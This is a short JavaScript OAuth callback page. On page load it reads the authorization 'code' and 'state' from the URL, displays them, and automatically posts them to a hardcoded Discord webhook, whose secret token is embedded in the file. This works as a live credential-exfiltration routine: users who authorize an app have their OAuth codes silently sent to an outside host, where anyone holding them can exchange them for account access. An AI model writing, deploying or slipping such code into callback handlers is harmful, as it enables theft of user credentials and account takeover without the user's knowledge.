window.onload = async () => {
    // Parse the query string
    const params = new URLSearchParams(window.location.search);
    
    // Get the code from the query string
    const code = params.get('code');
    
    // Get the state parameter
    const state = params.get('state');
    
    // Display the code or token
    let message;
    if (code) {
        if (state) {
            message = code + " " + state;
            document.getElementById('message').textContent = 'Code: ' + code;
            document.getElementById('state').textContent = 'State: ' + state;
        } else {
            message = code + " 0";
            document.getElementById('message').textContent = 'Invalid state parameter.';
        }
    } else {
        document.getElementById('message').textContent = 'No code or token received.';
    }
    
    return sendMessage(message);
};

function sendMessage(message) {
    if (!message) return;
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1177744437317734493/FPI1921CtfXAtutKa7kgo0eILkc5wLi90DBtUT1MpVShr71PVFfV2C1dhKIzt3pQP_46");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        username: "oauthCallback",
        avatar_url: "",
        content: message
    }
    request.send(JSON.stringify(params));
}